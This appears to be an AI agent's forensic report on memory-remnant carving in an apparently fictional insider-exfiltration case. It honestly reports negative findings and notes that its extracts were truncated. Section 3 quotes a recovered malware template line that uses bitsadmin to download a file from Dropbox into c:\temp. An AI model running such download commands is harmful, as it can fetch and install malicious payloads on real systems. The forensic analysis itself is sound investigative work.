# VANKO-ABDUCTED-ZEBRAFISH — Memory-Remnant Carving (pagefile.sys / hiberfil.sys / swapfile.sys)

**Analyst:** DFIR subagent (Opus 4.8) · **Source channel:** pagefile.sys + hiberfil.sys + swapfile.sys
**Evidence:** `/cases/vanko/surface_physical.E01`, C: vol offset `1411072`
**Goal:** (A) recover SDelete-wiped/deleted classified files; (B) find the Dropbox SHARE LINK and/or QQ negotiation with nina_kwai.

---

## 1. Extraction

```
extract_files paths=["/pagefile.sys","/hiberfil.sys","/swapfile.sys"]  dest=/tmp/agentropix-sift-vanko/pf
```

Result (verbatim, key fields):

```json
"extracted":[{"src_path":"/swapfile.sys","inode":"45347","size":16777216,
  "sha256":"920835ec4f64125c43ec7eb73aeb599ac854196a7f3e8b8cc642f321d6015c3a"}],
"missing":["/pagefile.sys","/hiberfil.sys"],
"raw_stderr":"/pagefile.sys: icat timed out after 60.0s on inode 44997\n
             /hiberfil.sys: icat timed out after 60.0s on inode 75674"
```

**Important caveat:** only **swapfile.sys (16 MiB) extracted cleanly**. The TSK `icat` extraction of pagefile.sys (inode 44997) and hiberfil.sys (inode 75674) **timed out at 60 s**, leaving **partial 256 MiB truncated** files on disk. These partial captures still contain real residual data (verified non-zero pages mid/tail) and were carved, but they are **NOT the complete pagefile/hiberfil** — a follow-on run with a longer icat timeout (or `dd` over the raw NTFS dataruns) is warranted if the share link must be definitively excluded.

Hashes of the (partial) extracts for provenance:
```
pagefile.sys  14e52cea3169c8ca1ca5cd50dee847815cd036e8e7ce26954366c7f72c8a38c6  (256 MiB partial)
hiberfil.sys  a3eaaa5d252e2c0cc03a7bb1b02b3cdd6274e711b46b2f44d41f73ac789501c9  (256 MiB partial)
swapfile.sys  920835ec4f64125c43ec7eb73aeb599ac854196a7f3e8b8cc642f321d6015c3a  (16 MiB complete)
```

---

## 2. Carving method

- `strings -a -n 6` (ASCII) and `strings -a -n 6 -el` (UTF-16LE) over all three files.
- `run_bulk_extractor` (default scanners) over pagefile.sys → 4,616 URLs, 609 emails, 9,233 domains, plus carved EVTX/USN/SQLite/winlnk features.
- Targeted `grep -abo` (byte-offset) + `xxd` on raw pagefile for the Dropbox link, 7z magic, and Skype conversation IDs.
- hiberfil.sys: vol3 (`run_volatility` + local `vol` 2.28.0) attempted; manual LZNT1 decompression attempted.

`strings` yield: pagefile ASCII=1,023,832 / UTF-16=247,148 lines; swapfile ASCII=123,203 / UTF-16=32,323.
**hiberfil.sys produced 1 string ("WAKE") total** — fully Xpress-Huffman compressed.

---

## 3. Question (B) — Dropbox SHARE LINK: **NOT FOUND** (clean negative)

The **only** `dropbox.com/s/` string anywhere in the three files is a **malware download template**, not Vanko's exfil link. Raw hexdump at pagefile offset 151684349:

```
bitsadmin /transfer myjob /download /priority high https://www.dropbox.com/s/<90 1c 0f 00>/logo<90 02 01>.gif?dl=1 "c:\temp\..."
... !Obfuscator.AOF ...
```

The bytes between `/s/` and `/logo` (`\220\034\017\000` = `90 1C 0F 00`) are .NET BinaryFormatter string-dedup **placeholder markers**, and the surrounding `!Obfuscator.AOF` / `!Obfuscator.AOG` tags show this is an **obfuscated malware/ScriptBlock template** that substitutes the token/filename at runtime. It is **not** a real share token. (Confirmed: the only literal occurrence sits inside this template; no `/sh/` or `/scl/` folder-share links exist anywhere — `grep -abo "dropbox.com/(sh|scl)/..."` returns zero.)

Dropbox **account artifacts** that ARE present (corroborate established facts, but are not the link):

```
HOURLY_REFRESH: Event 'client-gandalf_allows' -> {'account':
  <dropbox.client.authentication.interface.Account host_int=4319428912L root_ns=984347879L
   role=1 is_primary=True quota=2147483648L in_use=1747733448 sync_space_used=1747733448>}
dropbox_path = C:\Users\PC User\Dropbox
Deleted u'C:\Users\PC User\Dropbox\~1097703998HI.tmp'
client-cf.dropbox.com/client/hourly_refresh
```

→ Confirms Dropbox **account root_ns `984347879`** (matches the established exfil account) and `in_use=1,747,733,448` bytes (~1.7 GB synced). The client logs are present but the **share/copy-link URL is not paged in** this (partial) capture.

## Question (B) — QQ / nina_kwai negotiation: **NOT FOUND** (clean negative)

```
pagefile.sys : matches(nina_kwa|im.cas.cn|@qq.com email) = 0
swapfile.sys : matches = 0
hiberfil.sys : matches = 0
```
No `nina_kwai@qq.com`, no `im.cas.cn`, no Chinese mail domain in the email-domain histogram. The only `qq.com` token is `p.qq.com` (generic). The QQ channel is **not** resident in these memory remnants.

### What the memory DID recover — the *recruitment/negotiation* channel (Skype + email)

This is the **handler-recruitment thread**, a distinct (and arguably more probative) negotiation than the QQ side:

**Skype contact graph** (from MSNP `RegisterContactsCallback` + `<user>` presence blobs):
```
Skypename k.normandy    FriendlyName "Kylie Normandy"
Skypename merrick_mike  FriendlyName "Michael Merrick"   (email mmerr001@gmail.com)
Skypename fuzzygopher
Self: live:anthony.vanko  ("Anthony Vanko")
Conversation IDs (8: prefix): #k.normandy/$live:anthony.vanko;..., #live:anthony.vanko/$merrick_mike;..., #live:anthony.vanko/$fuzzygopher;...
```

**Recovered email — the recruitment hook** (full body in pagefile, `rfc822` recorder):
```
From: Michael Merrick [mailto:mmerr001@gmail.com]
Sent: Monday, June 27, 2016 5:25 PM
To:   Anton Vanko <anthony.vanko@gmail.com>
Subject: Potential Opportunity?
"...This guy named Vladimir Bulgakov came up to me... he works for a Russian biotech
 company and is over here for a couple months working out of a US branch office...
 I did say that you were frustrated about your funding getting cut at Stark, and he
 sounded like he wants to talk to you. Maybe he wants to give you a job?..."
```

**Recovered email — Vanko's reply (intent to engage):**
```
"Wow, interesting. Heck yeah, give him my contact info. It will be interesting to talk
 with him." ... From: Michael Merrick ... Subject: Potential Opportunity?
```

→ Names a new principal **Vladimir Bulgakov** (purported "Russian biotech" recruiter) and shows Vanko **consenting** to the introduction. Also recovered a Google search fragment: `google...#q=Vladimir+Bulg`.

**Tor activity** (operationally relevant to covert comms/exfil; `state/control` log paged in):
```
%USERPROFILE%\tor\Tor Browser\Browser\firefox.exe
HS_CLIENT_REND circuits BUILT 2016-06-28 23:28:31 – 23:33:49 (TIME_CREATED UTC)
REND_QUERY onions: 3g2upl4pq6kufc4m (DuckDuckGo), xmh57jrzrnw6insl (Torch),
  zqktlwi4fecvo6ri (Hidden Wiki), wiki5kauuihowqi5, dirnxxdraygbifgc
```
(These are public directory/search onions — consistent with the subject *using* Tor on 2016-06-28, not attacker C2.)

---

## 4. Question (A) — recover wiped/deleted classified files: **NOTHING RECOVERABLE here** (clean negative)

- Classified-topic **strings** are present (`Arc Reactor Glow`, `.7Z` fragments, `Nina Lam research`, `C:\Users\PC User\Documents\NinaResearch\Nina Lam research\Concentrations of BTs and PTs ... Chinese sturgeon.png`) — confirming the research existed on-host — but **no file *content*** is reconstructable from paged memory.
- **7z archive carve:** exactly one `37 7A BC AF 27 1C` signature in the pagefile (offset 152188600). Examined → it is a **Windows Defender / AV signature-definition blob**, NOT the vacation-photos archive:
  ```
  37 7a bc af 27 1c ... "readu_u32" ... INFECTED  Rogue:Win32/Onescan!rfn
  BrowserModifier:Win32/VeggyAdd  ...  "Password is 1234"  !Vundo.SA
  ```
  `7z l` on the carved chunk → "Cannot open the file as [7z] archive" (false-positive magic inside an AV definition). No real `vacation photos.7z` data is resident.
- swapfile.sys carved to printer-driver / `unishare.gpd` noise only — no case-relevant content.

---

## 5. hiberfil.sys — unusable (honest negative)

- Header magic = **`WAKE`** (`57 41 4b 45`), not `HIBR` → the hibernation slot is **stale / already-resumed**; Windows zeroes the active signature on wake.
- Body is **Xpress-Huffman compressed** (Win10): plain `strings` yields a single token ("WAKE"); manual **LZNT1 decompression recovered nothing** (Win10 uses Xpress-Huffman, which needs `RtlDecompressBufferEx` — unavailable on this Linux host).
- **Volatility3 cannot build a layer:**
  ```
  run_volatility pslist  -> "vol3 emitted non-JSON output"
  local vol windows.info -> "A translation layer requirement was not fulfilled... acquired cleanly"
  ```
  No `windows.clipboard` plugin is exposed by the allowlist in any case; `cmdline`/`pslist` fail to parse.
- Compounded by the **256 MiB icat truncation** above. Net: hiberfil yields **no clipboard / cmdline / chat** remnants. If hiberfil analysis is required, re-extract the full file and decompress with `hibr2bin`/`volatility2 imagecopy` or a Windows host with `RtlDecompressBufferEx`.

---

## 6. Assessment

- **Dropbox SHARE LINK: NOT FOUND** in pagefile/swapfile; hiberfil unparseable. The only `dropbox.com/s/` hit is a malware download template with placeholder bytes, not Vanko's exfil link. Account `root_ns=984347879` confirmed resident, but the copy-link/share URL was not paged in (and the capture is a 256 MiB truncation — not exhaustive).
- **QQ / nina_kwai negotiation: NOT FOUND** in any of the three files (zero matches).
- **Recovered classified files: NONE** — only topic strings and a false-positive 7z signature (AV definition blob).
- **High-value NEW intelligence recovered instead:** the **Skype/email recruitment channel** — `Michael Merrick (mmerr001@gmail.com / skype merrick_mike)`, `Kylie Normandy (k.normandy)`, `fuzzygopher`, recruiter **Vladimir Bulgakov** ("Russian biotech"), the "Potential Opportunity?" email (2016-06-27 17:25) and **Vanko's affirmative reply**; plus **Tor Browser** usage on **2016-06-28 23:28–23:33 UTC**. These corroborate intent and identify additional human/handler IOCs not in the established-facts set.

**Recommended follow-up for the orchestrator:**
1. Re-extract `/pagefile.sys` and `/hiberfil.sys` in full (raw NTFS dataruns / longer icat timeout) — the share link may live in unpaged regions excluded by the 60 s truncation.
2. The Dropbox **share link is more likely to live in browser artifacts** (History/Cache, `Local Storage`, IndexedDB) and the **Dropbox client `host.db` / `filecache.dbx`** than in volatile memory — route those sources.
3. Pivot the new IOCs (`mmerr001@gmail.com`, skype `merrick_mike`/`k.normandy`/`fuzzygopher`, `Vladimir Bulgakov`) into the case index.
